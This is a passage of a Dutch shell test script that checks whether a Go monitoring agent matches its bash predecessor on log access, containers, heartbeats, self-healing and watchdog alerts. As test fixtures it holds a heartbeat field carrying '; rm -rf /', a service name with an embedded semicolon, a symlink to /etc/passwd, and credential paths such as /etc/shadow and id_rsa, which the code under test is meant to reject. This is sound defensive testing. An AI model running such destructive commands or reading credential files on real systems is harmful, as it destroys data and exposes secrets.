printf 'oud\n' >"$L/opt/dienst/logs/dienst.log"; printf 'x\n' >"$L/opt/dienst/logs/uitvoer.txt"; printf 'geheim\n' >"$L/opt/dienst/logs/wachtwoord-passwd.log"; printf 'k\n' >"$L/opt/dienst/logs/server.key"
printf 'k\n' >"$L/opt/dienst/.ssh/id_rsa"; printf 'k\n' >"$L/opt/dienst/secrets/x.log"; printf 'x\n' >"$L/opt/dienst/instellingen.conf"; printf 'x\n' >"$L/opt/dienst/data.bin"; printf 'x\n' >"$L/opt/dienst/.verborgen.log"
printf 'x\n' >"$L/opt/ander/a.log"; printf 'x\n' >"$L/elders/buiten.log"; ln -s "$L/elders/buiten.log" "$L/var/log/link-naar-buiten.log"; ln -s "$L/var/log/syslog" "$L/elders/link-naar-binnen.log"
printf 'MONITOR_URL="http://127.0.0.1:1"\nLOG_DIRS="%s"\nLOG_DIRS_MAX="%s %s"\n' "$L/var/log" "$L/opt" "$L/bestaat-niet" >"$L/conf"
printf '%s\n' "$key" >"$L/gk/agent.key"
{
    printf '0\ttick\t60\n0\tlogdirs\t%s %s %s relatief /etc/../etc\n' "$L/opt/dienst" "$L/elders" "$L/opt/dienst/secrets"
    printf '51\tlog\t%s\tfout|error\n52\tlog\t%s\tFailed password\n53\tlog\t%s\tx\n54\tlog\t%s\tx\n55\tlog\t%s\t[ongeldig\n56\tlog\traar:bron\tx\n57\tlog\t%s\tfout\n58\tival\t3600\n58\tlog\t%s\tfout\n59\tlog\tha:core\tx\n' \
        "$L/var/log/app/app.log" "$L/var/log/syslog" "$L/elders/buiten.log" "$L/var/log/bestaat-niet.log" "$L/var/log/app/app.log" "$L/opt/dienst/logs/wachtwoord-passwd.log" "$L/opt/dienst/logs/dienst.log"
    printf '61\tlogsrc\tfile\t%s\t0\n62\tlogsrc\tfile\t%s\t2\n63\tlogsrc\tfile\t%s\t3\n64\tlogsrc\tfile\t%s\t1\n65\tlogsrc\tfile\t%s\t0\n66\tlogsrc\tha\tcore\t0\n67\tlogsrc\traar\t-\t0\n68\tlogsrc\tfile\t%s\t0\n0\tlogship\t60\n' \
        "$L/var/log/app/*.log" "$L/var/log/syslog" "$L/var/log/syslog" "$L/opt/dienst/logs/dienst.log" "$L/elders/*.log" "$L/var/log/geen-*.log"
    printf '0\tlogscan\t3\n0\tlogbrowse\t7\t%s\n' "$L/opt/dienst"
} >"$L/tests.cache"
LT_PATHS=("$L/var/log/app/app.log" "$L/var/log/link-naar-buiten.log" "$L/elders/link-naar-binnen.log" "$L/elders/buiten.log" "$L/opt/dienst/logs/dienst.log" "$L/opt/dienst/logs/uitvoer.txt"
    "$L/opt/dienst/logs/wachtwoord-passwd.log" "$L/opt/dienst/logs/server.key" "$L/opt/dienst/.ssh/id_rsa" "$L/opt/dienst/secrets/x.log" "$L/opt/dienst/instellingen.conf" "$L/opt/dienst/data.bin"
    "$L/opt/dienst/.verborgen.log" "$L/opt/ander/a.log" "$L/var/log/nieuw-bestaat-nog-niet.log" "$L/var/log/../../elders/buiten.log" "/etc/shadow" "/" "$L/opt/dienst/logs/Token.LOG" "$L/opt/dienst/logs/app.env.log" "$L/opt/dienst/logs/db.sqlite3")
bash_logs() {   # bash_logs <uitvoerbestand>: één ronde van de echte bash-code (log-checks, logs vinden, doorbladeren, verzamelen)
    (
        t_dir="$L/bt"; t_cache="$L/tests.cache"; k_dir="$L/bk"; HA_MODE=0; TEST=0; LOG_DIRS="$L/var/log"; LOG_DIRS_MAX="$L/opt $L/bestaat-niet"; LOG_SHIP=1; enc_key=""
        declare -A ival_by_id=([58]=3600)
        lap() { :; }
        ctrx() { shift; "$@"; }
        # shellcheck disable=SC1090
        source <(sed -n '/^json_escape() {/,/^}/p' agent/src/15-realtime.sh)
        # shellcheck disable=SC1090
        source <(sed -n '/^due_cached() {/,/^}/p' agent/src/40-basis-meten.sh)
        # shellcheck disable=SC1090
        source <(sed -n '/^log_results=""/,$p' agent/src/50-services-commandos-logs.sh)
        for p in "${LT_PATHS[@]}"; do
            printf '%d %d %d\t%s\n' "$(log_allowed "$p" && echo 1 || echo 0)" "$(log_secret "$p" && echo 1 || echo 0)" "$(log_like "$p" && echo 1 || echo 0)" "$p"
        done >"$1.allowed"
        # shellcheck disable=SC1090
        source <(docker() { return 127; }; cat agent/src/78-logs-vinden.sh)
        # shellcheck disable=SC1090
        source agent/src/92-logs.sh 2>/dev/null
        printf '{"logs":{%s},"scan":%s,"browse":%s}' "${log_results%,}" "${logscan_json:-null}" "${logbrowse_json:-null}" >"$1"
    )
}
go_logs() {   # go_logs <uitvoerbestand>: hetzelfde door de Go-agent
    (
        export RZSENSE_BASH_CONF="$L/conf" RZSENSE_BASH_CACHE="$L" RZSENSE_BASH_STATE="$L/gt" RZSENSE_BASH_KEYS="$L/gk" RZSENSE_DATA="$L/gd"
        "$work/rzsense" log-test allowed "${LT_PATHS[@]}" >"$1.allowed"
        printf '{"logs":%s,"scan":%s,"browse":%s}' "$("$work/rzsense" log-test check)" "$("$work/rzsense" log-test scan)" "$("$work/rzsense" log-test browse)" >"$1"
        "$work/rzsense" log-test ship
    )
}
cmp_logs() {   # cmp_logs <ronde>: de twee uitkomsten en de pakketjes in de wachtrij vergelijken
    python3 -I - "$L/bash$1.json" "$L/go$1.json" "$L/bk/logship" "$L/gk/logship" "$1" <<'PY'
import glob, gzip, json, sys
a, g = [json.load(open(p)) for p in sys.argv[1:3]]
bad = []
if open(sys.argv[1] + '.allowed').read() != open(sys.argv[2] + '.allowed').read():
    bad.append('welke bestanden mogen:\n bash\n%s go\n%s' % (open(sys.argv[1] + '.allowed').read(), open(sys.argv[2] + '.allowed').read()))
for k in sorted(set(a['logs']) | set(g['logs'])):
    if a['logs'].get(k) != g['logs'].get(k):
        bad.append('log-check #%s:\n bash %s\n go   %s' % (k, json.dumps(a['logs'].get(k), ensure_ascii=False), json.dumps(g['logs'].get(k), ensure_ascii=False)))
sa, sg = a['scan'], g['scan']
if (sa is None) != (sg is None):
    bad.append('logs vinden: bash %s, go %s' % ('ja' if sa else 'nee', 'ja' if sg else 'nee'))
elif sa:
    for d in (sa, sg):
        d.pop('at'); d.pop('units'); d.pop('docker'); d['files'] = sorted(d['files']); d['noread'] = sorted(d['noread'])
    if sa != sg:
        bad.append('logs vinden:\n bash %s\n go   %s' % (json.dumps(sa, ensure_ascii=False), json.dumps(sg, ensure_ascii=False)))
ba, bg = a['browse'], g['browse']
for d in (ba, bg):
    if d:
        d['dirs'] = sorted(d['dirs']); d['files'] = sorted(d['files'])
if ba != bg:
    bad.append('doorbladeren:\n bash %s\n go   %s' % (json.dumps(ba, ensure_ascii=False), json.dumps(bg, ensure_ascii=False)))
def batches(d):
    out = []
    for f in sorted(glob.glob(d + '/b*.gz')):
        rows = gzip.open(f, 'rt', encoding='utf-8', errors='replace').read().split('\n')
        h = rows[0].split('\t')
        body = []
        for r in rows[1:]:
            c = r.split('\t')
            if c[0] == 'L':
                c[2] = 'T'
            body.append('\t'.join(c))
        out.append([h[0], h[3], h[4]] + body)
    return out
# gesorteerd op inhoud: twee pakketjes uit dezelfde seconde hebben een willekeurige volgorde (de naam eindigt op een toevalsgetal)
qa, qg = sorted(batches(sys.argv[3])), sorted(batches(sys.argv[4]))
if qa != qg:
    fa, fg = [r for b in qa for r in b], [r for b in qg for r in b]
    bad.append('pakketjes (%d en %d):\n alleen bash %s\n alleen go   %s' % (len(qa), len(qg), json.dumps([r for r in fa if r not in fg], ensure_ascii=False), json.dumps([r for r in fg if r not in fa], ensure_ascii=False)))
if bad:
    print('\n'.join(bad)); sys.exit(1)
print('%d %d %d %d' % (sum(v.get('new', 0) for v in a['logs'].values()), len(sa['files']) if sa else -1, len(ba['files']) + len(ba['dirs']) if ba else -1, sum(len([r for r in b if r.startswith('L\t')]) for b in qa)))
PY
}
bash_logs "$L/bash1.json" || fail "de bash-code voor logs faalde (ronde 1)"
go_logs "$L/go1.json" || fail "de Go-agent kon de logs niet lezen (ronde 1)"
got=$(cmp_logs 1) || fail "logs, ronde 1: de Go-agent doet het anders dan de bash-agent: $got"
[ "${got%% *}" = 0 ] || fail "logs, ronde 1: oude regels horen niet mee te tellen: $got"
# Nieuwe regels: treffers, IP-adressen, een halve regel, vreemde tekens, niveaus
printf 'Fout bij verbinden met 203.0.113.7\nalles goed\nERROR 203.0.113.7 time-out\nfout vanaf 198.51.100.9 \033[31mrood\033[0m\ndebug: detail\nhalve regel zonder einde' >>"$L/var/log/app/app.log"
printf 'Oct 21 10:00:01 nas sshd[1]: Failed password for root from 203.0.113.7 port 1 ssh2\nOct 21 10:00:02 nas kernel: warning: iets\nOct 21 10:00:03 nas app: connection refused\r\nOct 21 10:00:04 nas app: gewoon\n' >>"$L/var/log/syslog"
printf 'INFO gestart\nTRACE diep\nfout in dienst\n' >>"$L/opt/dienst/logs/dienst.log"
rm -f "$L/bk/logship/last" "$L/gk/logship/last" "$L/bt/logscan.cache" "$L/gd/logscan.cache"; rm -f "$L/bt/logbrowse.done" "$L/gd/logbrowse.done"
bash_logs "$L/bash2.json" || fail "de bash-code voor logs faalde (ronde 2)"
go_logs "$L/go2.json" || fail "de Go-agent kon de logs niet lezen (ronde 2)"
got=$(cmp_logs 2) || fail "logs, ronde 2: de Go-agent doet het anders dan de bash-agent: $got"
read -r lt_hits lt_files lt_browse lt_lines <<<"$got"
{ [ "$lt_hits" -ge 4 ] && [ "$lt_files" -ge 3 ] && [ "$lt_browse" -ge 2 ] && [ "$lt_lines" -ge 6 ]; } || fail "logs: onverwacht weinig gevonden ($got)"
echo "✔ logs: welke bestanden mogen (${#LT_PATHS[@]} paden), $lt_hits treffers van log-checks, $lt_files gevonden logs, een map doorbladeren en $lt_lines regels in de pakketjes: gelijk aan de bash-agent"

# 1.351.0 (Go-agent 0.20.0): containers (Podman en Docker) en heartbeats: de echte bash-code en de Go-agent met dezelfde
# namaak-podman en namaak-docker (vaste uitvoer; de tweede meting van "stats" geeft hogere tellers)
C="$work/ct"
mkdir -p "$C/bin" "$C/vol/data" "$C/vol/leeg" "$C/bcache" "$C/gdata" "$C/hb"
head -c 5000 /dev/zero >"$C/vol/data/bestand"
cat >"$C/bin/podman" <<EOS
#!/bin/sh
n="\$CT_MARK"
case "\$*" in
    "ps -q") echo aaa ;;
    "version --format"*) echo 5.2.2 ;;
    stats*) if [ -e "\$n" ]; then printf 'aaa111|2500000000|4000000000|104857600|1073741824|27.2MB / 25.1kB|4096|8192|12\nbbb222|900000000|4000000000|5242880|0|0B / 0B|0|0|1\n'
            else : >"\$n"; printf 'aaa111|1500000000|2000000000|104857600|1073741824|27.1MB / 25kB|4096|8192|12\nbbb222|800000000|2000000000|5242880|0|0B / 0B|0|0|1\n'; fi ;;
    "ps -a --pod"*) printf 'aaa111|web|docker.io/library/nginx:1.27|running|Up 3 hours (healthy)|0|2|webpod|false|1795000000|11.8kB (virtual 8.12MB)\nbbb222|db "prod"|quay.io/x/postgres:16|running|Up 3 hours (unhealthy)|0|0||false|1795000100|2.5MB (virtual 300MB)\nccc333|oud|alpine|exited|Exited (137) 2 days ago|137|5||false|1794000000|0B (virtual 7MB)\nddd444|infra|k8s.gcr.io/pause|running|Up 3 hours|0|0|webpod|true|1795000000|0B\n' ;;
    "pod ps"*) printf 'webpod|Running|2\n' ;;
    "system df"*) printf 'Images|812000000|300000000|7|3\nContainers|2511800|0|4|3\nLocal Volumes|5000|0|2|1\n' ;;
    "ps -aq --no-trunc") printf 'aaa111\nbbb222\nccc333\nddd444\n' ;;
    inspect*) printf 'aaa111|$C/vol/data;$C/vol/leeg;\nbbb222|$C/vol/data;\nccc333|\nddd444|\n' ;;
    *) exit 1 ;;
esac
EOS
cat >"$C/bin/docker" <<EOS
#!/bin/sh
case "\$*" in
    "--version") echo "Docker version 27.3.1, build ce12230" ;;
    info|"ps -q") echo ok ;;
    "ps -q --no-trunc"|"ps -aq --no-trunc") printf 'eee555\nfff666\n' ;;
    stats*) printf 'eee555|1.25%%|12.5MiB / 1.5GiB|1.2kB / 3.4MB|0B / 4.1MB|3\n' ;;
    "version --format"*) echo 27.3.1 ;;
    inspect*) printf 'eee555|0|1|2026-11-20T10:00:00.123456789Z|$C/vol/data;\nfff666|1|0|2026-11-19T08:30:00Z|\n' ;;
    "ps -a --size"*) printf 'eee555|proj-web-1|nginx:latest|running|Up 2 days (starting)|proj|1.09kB (virtual 133MB)\nfff666|los|busybox|exited|Exited (1) 3 days ago||0B (virtual 4.26MB)\n' ;;
    "ps -a --format"*) printf 'proj|running\n|exited\n' ;;
    "system df"*) printf 'Images|1.2GB|600MB (50%%)|5|2\nContainers|1.09kB|0B (0%%)|2|1\nLocal Volumes|5kB|0B (0%%)|1|1\nBuild Cache|0B|0B|0|0\n' ;;
    *) exit 1 ;;
esac
EOS
chmod 755 "$C/bin/podman" "$C/bin/docker"
# Heartbeats: geschreven door het echte rzmon-hb, plus een ongeldig bestand en een symlink (die horen niet mee te gaan)
for hbset in b g; do
    mkdir -p "$C/hb/$hbset"
    HB_DIR="$C/hb/$hbset" bash agent/rzmon-agent.sh --hb backup-db ok "klaar in 12 s" --value 3.5 || fail "rzmon-hb faalde"
    sleep 0.05
    HB_DIR="$C/hb/$hbset" bash agent/rzmon-agent.sh --hb nacht.taak fail 'fout: "schijf vol" \ einde' || fail "rzmon-hb faalde"
    printf '{"n":"x","s":"ok","t":1,"m":"","extra":"; rm -rf /"}\n' >"$C/hb/$hbset/hb.ongeldig"
    ln -s /etc/passwd "$C/hb/$hbset/hb.link"
done
(
    PATH="$C/bin:$PATH"; export CACHE_DIRECTORY="$C/bcache" CT_MARK="$C/mark.bash"; PODMAN=1; DOCKER=1; PODMAN_USERS=""; HA_MODE=0; hb_dir="$C/hb/b"
    lap() { :; }
    # shellcheck disable=SC1090
    source <(sed -n '/^ctr_busy=""/,/^# Agent 1.67.0: PID van deze run/p' agent/src/40-basis-meten.sh | sed '$d')
    # shellcheck disable=SC1090
    source <(sed -n '/^# -\{10,\} Podman: voorbereiding/,/^pod_stats_a=""/p' agent/src/40-basis-meten.sh)
    pod_stats_a=$(podman_stats a)
    # shellcheck disable=SC1090
    source <(sed -n '/^podman_json=""/,/^# -\{10,\} Proxmox VE/p' agent/src/70-containers-en-proxmox.sh | sed '$d')
    # shellcheck disable=SC1090
    source <(sed -n '/^hb_json=""; hb_files=()/,/^# -\{10,\} Zelf herstellen en waakhond/p' agent/src/85-meesturen.sh | sed '$d')
    printf '{"podman":%s,"busy":"%s","hb":[%s]}' "${podman_json:-null}" "$ctr_busy" "$hb_json" >"$C/bash.json"
) || fail "de bash-code voor containers en heartbeats faalde"
printf 'MONITOR_URL="%s"\nPODMAN_USERS=""\nHB_DIR="%s"\n' "$BASE" "$C/hb/g" >"$C/conf"
PATH="$C/bin:$PATH" CT_MARK="$C/mark.go" RZSENSE_BASH_CONF="$C/conf" RZSENSE_DATA="$C/gdata" "$work/rzsense" ctr-check >"$C/go.json" || fail "de Go-agent kon de containers niet lezen"
python3 -I - "$C/bash.json" "$C/go.json" <<'PY' || fail "de Go-agent leest containers of heartbeats anders dan de bash-agent"
import json, sys
a, g = [json.load(open(p)) for p in sys.argv[1:3]]
bad = []
pa, pg = a['podman'], g['podman']
for d in (pa, pg):
    d['pods'] = sorted(d['pods'], key=lambda p: (p['user'], p['name']))
    d['containers'] = sorted(d['containers'], key=lambda c: (c['user'], c['name']))
for k in sorted(set(pa) | set(pg)):
    if k == 'containers':
        for x, y in zip(pa[k], pg[k]):
            for f in sorted(set(x) | set(y)):
                if x.get(f) != y.get(f):
                    bad.append('container %s, %s: bash %r, go %r' % (x.get('name'), f, x.get(f), y.get(f)))
        if len(pa[k]) != len(pg[k]):
            bad.append('aantal containers: bash %d, go %d' % (len(pa[k]), len(pg[k])))
    elif pa.get(k) != pg.get(k):
        bad.append('%s: bash %s, go %s' % (k, json.dumps(pa.get(k), ensure_ascii=False), json.dumps(pg.get(k), ensure_ascii=False)))
if a['busy'] != g['busy']:
    bad.append('ctr_busy: bash %r, go %r' % (a['busy'], g['busy']))
ha, hg = [[{k: v for k, v in h.items() if k != 't'} for h in d['hb']] for d in (a, g)]
if ha != hg:
    bad.append('heartbeats:\n bash %s\n go   %s' % (json.dumps(ha, ensure_ascii=False), json.dumps(hg, ensure_ascii=False)))
web = [c for c in pa['containers'] if c['name'] == 'web']
if bad or len(pa['containers']) != 5 or not web or web[0]['cpu'] != 50.0 or web[0]['volumes'] <= 0 or len(ha) != 2:
    print('\n'.join(bad) or 'onverwachte testgegevens: %s' % json.dumps(pa, ensure_ascii=False)); sys.exit(1)
print('✔ containers: %d containers (Podman en Docker), CPU, geheugen, netwerk, volumes, pods en opslag, en %d heartbeats: gelijk aan de bash-agent' % (len(pa['containers']), len(ha)))
PY
for hbset in b g; do { [ ! -e "$C/hb/$hbset/hb.ongeldig" ] && [ -L "$C/hb/$hbset/hb.link" ] && [ "$(find "$C/hb/$hbset" -name 'hb.*' -type f | wc -l)" = 2 ]; } || fail "heartbeats ($hbset): een ongeldig bestand hoort weg te gaan, een symlink blijft staan, geldige regels blijven tot RzSense ze heeft"; done

# 1.352.0 (Go-agent 0.21.0): zelf herstellen: de echte bash-code en de Go-agent met dezelfde namaak-systemctl en -podman
H="$work/heal"
mkdir -p "$H/bin" "$H/cmd" "$H/bt" "$H/gstate"
cat >"$H/bin/systemctl" <<'EOS'
#!/bin/sh
# namaak: de status per dienst staat in $HEAL_STATE/svc.<naam> (standaard active); "kapot" laat zich niet herstarten
f="$HEAL_STATE/svc.$2"
case "$1" in
    is-active) st=$(cat "$f" 2>/dev/null || echo active); echo "$st"; [ "$st" = active ] ;;
    restart) echo "$2" >>"$HEAL_STATE/restarts"; [ "$2" = kapot ] && exit 1; echo active >"$f" ;;
esac
EOS
cat >"$H/bin/podman" <<'EOS'
#!/bin/sh
case "$1" in
    ps) echo x ;;
    inspect) cat "$HEAL_STATE/ctr.$4" 2>/dev/null || exit 1 ;;
    start) echo "$2" >>"$HEAL_STATE/starts"; [ "$2" = stuk ] && exit 1; echo running >"$HEAL_STATE/ctr.$2" ;;
    *) exit 1 ;;
esac
EOS
printf '#!/bin/sh\necho "cache geleegd"\necho tweede regel\n' >"$H/cmd/ok.sh"; printf '#!/bin/sh\necho "kan niet" >&2\nexit 3\n' >"$H/cmd/fout.sh"
printf '#!/bin/sh\necho open\n' >"$H/cmd/open.sh"; printf '#!/bin/sh\necho x\n' >"$H/cmd/niet-uitvoerbaar"; ln -s "$H/cmd/ok.sh" "$H/cmd/link.sh"
chmod 755 "$H/bin/systemctl" "$H/bin/podman" "$H/cmd/ok.sh" "$H/cmd/fout.sh"; chmod 777 "$H/cmd/open.sh"; chmod 644 "$H/cmd/niet-uitvoerbaar"
printf '0\ttick\t60\n71\theal\tsvc\tweb\n72\theal\tsvc\tkapot\n73\theal\tsvc\tgoed\n74\theal\tctr\troot/app\n75\theal\tctr\troot/stuk\n76\theal\tsvc\traar;naam\n77\theal\tctr\tbestaat-niet-xyz/x\n78\theal\tctr\troot/draait\n' >"$H/tests.cache"
heal_state() { mkdir -p "$1"; echo failed >"$1/svc.web"; echo inactive >"$1/svc.kapot"; echo exited >"$1/ctr.app"; echo dead >"$1/ctr.stuk"; echo running >"$1/ctr.draait"; }
heal_state "$H/bstate"; heal_state "$H/gstate"
bash_heal() {   # bash_heal <uitvoer>: herstellen, de herstelcommando's uit het antwoord, en wat er met het rapport meegaat
    (
        PATH="$H/bin:$PATH"; export HEAL_STATE="$H/bstate"; t_dir="$H/bt"; t_cache="$H/tests.cache"; HEAL=1; TEST=0; HA_MODE=0; HEAL_DIR="$H/cmd"; seal_n=x; podman_ctx=(root)
        id() { if [ "${1-}" = -u ] && [ $# = 1 ]; then echo 0; else command id "$@"; fi; }
        sleep() { :; }; lap() { :; }
        # shellcheck disable=SC1090
        source <(sed -n '/^json_escape() {/,/^}/p' agent/src/15-realtime.sh)
        # shellcheck disable=SC1090
        source <(sed -n '/^ctr_busy=""/,/^# Agent 1.67.0: PID van deze run/p' agent/src/40-basis-meten.sh | sed '$d')
        # shellcheck disable=SC1090
        source <(sed -n '/^pm() {/,/^}/p' agent/src/40-basis-meten.sh)
        # shellcheck disable=SC1090
        source <(sed -n '/^heal_dir="\$t_dir\/heal"/,/^# -\{10,\} Services/p' agent/src/40-basis-meten.sh | sed '$d')
        resp='{"ok":true,"heal_run":[[81,"ok.sh"],[82,"open.sh"],[83,"fout.sh"],[84,"bestaat-niet"],[85,"link.sh"]]}'
        # shellcheck disable=SC1090
        source <({ sed -n '/^    if \[ -n "\$seal_n" \] && \[ "\$HEAL" != 0 \]/,/tr -d .\[\]./p' agent/src/90-versturen.sh; echo fi; })
        # shellcheck disable=SC1090
        source <(sed -n '/^heal_json=""; heal_cmds=""/,/^# Agent 1.89.0: logboek/p' agent/src/85-meesturen.sh | sed '$d')
        printf '{"heal":[%s],"heal_cmds":[%s]}' "$heal_json" "$heal_cmds" >"$1"
    )
}
go_heal() {
    (
        export PATH="$H/bin:$PATH" HEAL_STATE="$H/gstate" RZSENSE_BASH_CACHE="$H" RZSENSE_BASH_STATE="$H/gt" RZSENSE_BASH_CONF="$H/conf" RZSENSE_DATA="$H/gd" RZSENSE_TEST_FAST=1 RZSENSE_TEST_ROOT=1
        "$work/rzsense" heal-test run
        for o in "81 ok.sh" "82 open.sh" "83 fout.sh" "84 bestaat-niet" "85 link.sh"; do
            # shellcheck disable=SC2086
            "$work/rzsense" heal-test cmd $o
        done
        "$work/rzsense" heal-test report >"$1"
    )
}
printf 'MONITOR_URL="%s"\nHEAL_DIR="%s"\nPODMAN_USERS=""\nDOCKER="0"\n' "$BASE" "$H/cmd" >"$H/conf"
cmp_heal() {
    python3 -I - "$H/bash$1.json" "$H/go$1.json" "$H/bstate" "$H/gstate" "$H/bt/heal" "$H/gt/heal" <<'PY'
import glob, json, os, sys
a, g = [json.load(open(p)) for p in sys.argv[1:3]]
bad = []
strip = lambda l: sorted((h['id'], h['ok'], h['m'].replace('/gstate', '/S').replace('/bstate', '/S')) for h in l or [])
if strip(a['heal']) != strip(g['heal']):
    bad.append('uitkomsten:\n bash %s\n go   %s' % (json.dumps(strip(a['heal']), ensure_ascii=False), json.dumps(strip(g['heal']), ensure_ascii=False)))
if sorted(a['heal_cmds'] or []) != sorted(g['heal_cmds'] or []):
    bad.append('herstelcommando\'s: bash %r, go %r' % (a['heal_cmds'], g['heal_cmds']))
for f in ('restarts', 'starts'):
    x, y = [open(os.path.join(d, f)).read() if os.path.exists(os.path.join(d, f)) else '' for d in sys.argv[3:5]]
    if x != y:
        bad.append('%s: bash %r, go %r' % (f, x, y))
tr = [sorted((os.path.basename(p), len(open(p).read().split())) for p in glob.glob(d + '/*.tries')) for d in sys.argv[5:7]]
if tr[0] != tr[1]:
    bad.append('pogingen: bash %r, go %r' % (tr[0], tr[1]))
if bad:
    print('\n'.join(bad)); sys.exit(1)
print(len(a['heal']), len(a['heal_cmds'] or []), open(os.path.join(sys.argv[3], 'restarts')).read().split(), json.dumps(strip(a['heal']), ensure_ascii=False))
PY
}
bash_heal "$H/bash1.json" || fail "de bash-code voor zelf herstellen faalde"
go_heal "$H/go1.json" || fail "de Go-agent kon niet herstellen"
got=$(cmp_heal 1) || fail "zelf herstellen: de Go-agent doet het anders dan de bash-agent: $got"
case "$got" in *'web'*'kapot'*) ;; *) fail "zelf herstellen: web en kapot horen een herstartpoging te krijgen: $got" ;; esac
grep -q 'herstart gelukt' <<<"$got" && grep -q 'herstart mislukt' <<<"$got" && grep -q 'container app was exited, gestart' <<<"$got" || fail "zelf herstellen: onverwachte uitkomsten: $got"
[ "$(cat "$H/gstate/svc.web")" = active ] || fail "de dienst web is niet herstart"
[ ! -e "$H/gstate/svc.goed" ] || fail "een dienst die draait is toch aangeraakt"
! grep -qx draait "$H/gstate/starts" || fail "een container die draait is toch gestart"
lt_first=$got
# Meteen nog een ronde: binnen 10 minuten geen nieuwe poging voor wat nog stuk is
for d in "$H/bt/heal" "$H/gt/heal"; do rm -f "$d/done" "$d/done.sending"; done
bash_heal "$H/bash2.json" || fail "de bash-code voor zelf herstellen faalde (ronde 2)"
go_heal "$H/go2.json" || fail "de Go-agent kon niet herstellen (ronde 2)"
got=$(cmp_heal 2) || fail "zelf herstellen, ronde 2: de Go-agent doet het anders dan de bash-agent: $got"
[ "${got%% *}" = 0 ] || fail "binnen 10 minuten hoort er geen nieuwe poging te komen: $got"
[ "$(grep -c kapot "$H/gstate/restarts")" = 1 ] || fail "kapot is binnen 10 minuten twee keer herstart"
echo "✔ zelf herstellen: ${lt_first%% *} uitkomsten (dienst herstart, container gestart, mislukte pogingen, herstelcommando's) en de grens van één poging per 10 minuten: gelijk aan de bash-agent"

# 1.353.0 (Go-agent 0.22.0): de waakhond. Een lokale namaak-dienst neemt de berichten aan (nooit de echte Pushover of
# ntfy); de echte bash-code en de Go-agent doorlopen dezelfde reeks: onbereikbaar, alarm, weer bereikbaar, cron stil.
W="$work/wd"
mkdir -p "$W/b" "$W/g" "$W/gd"
cat >"$W/srv.py" <<'PY'
import email, json, sys
from http.server import BaseHTTPRequestHandler, HTTPServer
out = sys.argv[1]
class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get('Content-Length', 0)))
        ct = self.headers.get('Content-Type', '')
        if ct.startswith('multipart/'):
            m = email.message_from_bytes(b'Content-Type: ' + ct.encode() + b'\r\n\r\n' + body)
            fields = {p.get_param('name', header='content-disposition'): p.get_payload(decode=True).decode() for p in m.get_payload()}
        else:
            fields = json.loads(body)
        with open(out + self.path.replace('/', '.'), 'a') as f:
            f.write(json.dumps({'auth': self.headers.get('Authorization', ''), 'fields': fields}, ensure_ascii=False, sort_keys=True) + '\n')
        self.send_response(200); self.end_headers(); self.wfile.write(b'{}')
s = HTTPServer(('127.0.0.1', 0), H)
open(out + '.port', 'w').write(str(s.server_address[1]))
s.serve_forever()
PY
python3 -I "$W/srv.py" "$W/rec" >/dev/null 2>&1 &
wd_srv=$!
trap 'kill "$wd_srv" 2>/dev/null || true; kill "$sleeper" 2>/dev/null || true; rm -rf "$work"; php -r "require \"src/bootstrap.php\"; q(\"DELETE FROM hosts WHERE name = ?\", [\"go-e2e\"]);" 2>/dev/null || true' EXIT
for _ in 1 2 3 4 5 6 7 8 9 10; do [ -s "$W/rec.port" ] && break; sleep 0.3; done
wd_port=$(cat "$W/rec.port" 2>/dev/null) || fail "de namaak-dienst voor de waakhond startte niet"
wd_tests() { printf '0\ttick\t60\n0\twatchdog\t5\tgebruiker-test\ttoken-test\t2\thttp://127.0.0.1:%s/ntfy-%s\twaakhond_test\tntfy-token-test\n' "$wd_port" "$1" >"$W/$1/tests.cache"; }
wd_tests b; wd_tests g
printf 'MONITOR_URL="%s"\nPUSHOVER_API="http://127.0.0.1:%s/po-g"\n' "$BASE" "$wd_port" >"$W/conf"
bash_wd() {   # bash_wd <rc> <antwoord> <reden>: de waakhond van de bash-agent na één ronde
    (
        t_dir="$W/b"; t_cache="$W/b/tests.cache"; wd_file="$W/b/watchdog"; WATCHDOG=1; TEST=0; rc=$1; resp=$2; st_err=$3; hostname=$(hostname); PUSHOVER_API="http://127.0.0.1:$wd_port/po-b"
        # shellcheck disable=SC1090
        source <(sed -n '/^json_escape() {/,/^}/p' agent/src/15-realtime.sh)
        # shellcheck disable=SC1090
        source <(sed -n '/^wd_line=/,/^exit "\$rc"/p' agent/src/95-waakhond.sh | sed '$d')
    )
}
go_wd() { RZSENSE_BASH_CONF="$W/conf" RZSENSE_BASH_CACHE="$W/g" RZSENSE_BASH_STATE="$W/g" RZSENSE_DATA="$W/gd" "$work/rzsense" wd-test "$@"; }
# 1: net onbereikbaar (nog geen alarm). 2: al 10 minuten (alarm). 3: nog steeds (geen tweede alarm). 4: terug (herstelbericht
# en een notitie voor RzSense). 5: de checks staan stil. 6: nog steeds (geen tweede). 7: de checks draaien weer.
bash_wd 7 '' 'time-out'; go_wd fail 'time-out'
[ ! -e "$W/rec.po-b" ] && [ ! -e "$W/rec.po-g" ] || fail "de waakhond gaf meteen alarm (hoort pas na 5 minuten)"
for d in b g; do printf 'wd_down=%s\nwd_sent=0\nwd_self=0\nwd_cron=0\n' "$(($(date +%s) - 620))" >"$W/$d/watchdog"; done   # 620 s: ruim binnen dezelfde minuut bij het afronden
bash_wd 7 '' 'time-out'; go_wd fail 'time-out'
bash_wd 7 '' 'time-out'; go_wd fail 'time-out'
bash_wd 0 '{"ok":true}' ''; go_wd ok
bash_wd 0 '{"ok":true,"cron_age":1200}' ''; go_wd ok 1200
bash_wd 0 '{"ok":true,"cron_age":1500}' ''; go_wd ok 1500
bash_wd 0 '{"ok":true,"cron_age":20}' ''; go_wd ok 20
python3 -I - "$W" <<'PY' || fail "de waakhond van de Go-agent doet het anders dan die van de bash-agent"
import json, re, sys
W = sys.argv[1]
bad = []
def rows(name):
    try:
        return [json.loads(l) for l in open('%s/rec.%s' % (W, name))]
    except FileNotFoundError:
        return []
for kind in ('po', 'ntfy'):
    a, g = rows(kind + '-b'), rows(kind + '-g')
    if a != g:
        bad.append('%s:\n bash %s\n go   %s' % (kind, json.dumps(a, ensure_ascii=False), json.dumps(g, ensure_ascii=False)))
po = rows('po-b')
titles = [r['fields']['title'] for r in po]
want = ['⚠️ RzSense onbereikbaar', '✅ RzSense weer bereikbaar', '⚠️ RzSense: checks staan stil', '✅ RzSense: checks draaien weer']
if titles != want:
    bad.append('berichten: %s' % json.dumps(titles, ensure_ascii=False))
elif po[0]['fields'].get('retry') != '120' or po[0]['fields']['priority'] != '2' or po[1]['fields']['priority'] != '-1' or 'time-out' not in po[0]['fields']['message']:
